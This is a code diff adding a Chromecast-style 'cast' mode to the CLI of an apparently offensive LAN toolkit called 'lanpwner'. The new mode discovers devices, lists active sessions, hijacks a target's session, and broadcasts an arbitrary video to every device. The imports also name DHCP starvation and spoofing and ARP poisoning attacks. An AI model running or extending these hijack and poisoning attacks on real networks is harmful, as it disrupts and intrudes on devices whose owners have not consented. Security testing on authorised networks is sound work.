@@ -2,6 +2,7 @@ import argparse
 import sys
 import importlib
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import asyncio
 try:
     from tqdm import tqdm
 except ImportError:
@@ -9,6 +10,7 @@ except ImportError:
 from lanpwner.protocols.upnp import UPnPModule
 from lanpwner.protocols.bonjour import BonjourModule
 from lanpwner.protocols.rtsp import RTSPModule
+from lanpwner.protocols.cast import CastModule
 from lanpwner.core.reporting import ReportGenerator
 from lanpwner.cli import build_host_inventory, sniff_protocols, dhcp_starvation_attack, dhcp_spoof_attack, dhcp_inform_flood, dhcp_option_overload, dhcp_leasequery, dhcp_decline_flood, dhcp_release_flood, dhcp_relay_spoof, arp_spoof_attack, arp_request_flood, arp_reply_flood, arp_cache_poison, arp_gratuitous, arp_reactive_poison, arp_malformed_flood, arp_scan, arp_storm
 
@@ -449,6 +451,58 @@ def main():
                         proto_threads = sip_threads
                     enumerate_and_report(module, devices, report, check_misconfig=(proto!="bonjour" and proto!="sip"), debug=args.debug or global_debug, threads=proto_threads, progress_label=proto.upper())
             print(f'[*] Batch scan complete. {report.discovery_count()} devices found, {report.vulnerability_count()} vulnerabilities detected.')
+
+        elif args.protocol == 'cast':
+            cast = CastModule(debug=args.debug)
+            loop = asyncio.get_event_loop()
+
+            # Discover devices first
+            print("[*] Discovering cast-capable devices...")
+            devices = loop.run_until_complete(cast.discover_devices())
+            print(f"[*] Found {len(devices)} device(s)")
+
+            if args.detect_sessions:
+                print("[*] Detecting active casting sessions...")
+                sessions = loop.run_until_complete(cast.detect_sessions())
+                if sessions:
+                    print(f"[*] Found {len(sessions)} active session(s):")
+                    for session in sessions:
+                        print(f"\nDevice: {session['device_name']} ({session['device_type']})")
+                        print(f"Status: {session['status']}")
+                        print(f"App: {session['app']}")
+                        print(f"Media Type: {session['media_type']}")
+                        print(f"Progress: {session['current_time']}/{session['duration']} seconds")
+                        print(f"Volume: {session['volume']}")
+                else:
+                    print("[*] No active casting sessions found")
+
+            elif args.hijack:
+                if not args.target:
+                    print("[!] Error: --target is required for hijack")
+                    sys.exit(1)
+                if not args.video_url:
+                    print("[!] Error: --video-url is required for hijack")
+                    sys.exit(1)
+
+                print(f"[*] Attempting to hijack session on {args.target}...")
+                success = loop.run_until_complete(cast.hijack_session(args.target, args.video_url))
+                if not success:
+                    print("[!] Failed to hijack session")
+                    sys.exit(1)
+
+            elif args.broadcast:
+                if not args.video_url:
+                    print("[!] Error: --video-url is required for broadcast")
+                    sys.exit(1)
+
+                print("[*] Broadcasting video to all discovered devices...")
+                results = loop.run_until_complete(cast.broadcast_to_all(args.video_url))
+                print("\nBroadcast Results:")
+                for result in results:
+                    status = "✓" if result['status'] == 'success' else "✗"
+                    print(f"{status} {result['device']} ({result['type']})")
+                    if result['status'] == 'failed':
+                        print(f"   Error: {result['error']}")
 
         else:
             print('[!] No valid protocol selected.')
